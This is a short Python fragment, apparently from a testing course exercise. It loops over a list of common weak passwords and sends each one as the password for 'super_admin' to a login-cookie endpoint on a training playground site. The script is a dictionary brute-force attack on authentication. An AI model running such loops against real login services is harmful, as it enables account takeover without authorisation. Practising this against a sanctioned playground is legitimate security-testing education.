...
111111,'trustno1','admin','monkey',1234567890,'welcome','welcome','admin','qwerty',123,
...
'superman','michael','princess','696969','qwertyuiop','hottie','freedomaa123456','princess'
'qazwsx','ninja','azerty123123','sololoveme','whatever','donalddragon'
'michael','mustang','trustno1','batman','passw0rd','zaq1zaq1','qazwsx','password1','password1'
'football','password1',000000,'trustno1','starwars','password1','trustno1','qwerty123123qwe'
...
for line in list_pass:
    response = requests.get("https://playground.learnqa.ru/ajax/api/get_auth_cookie", params={'login':'super_admin', 'password':line})
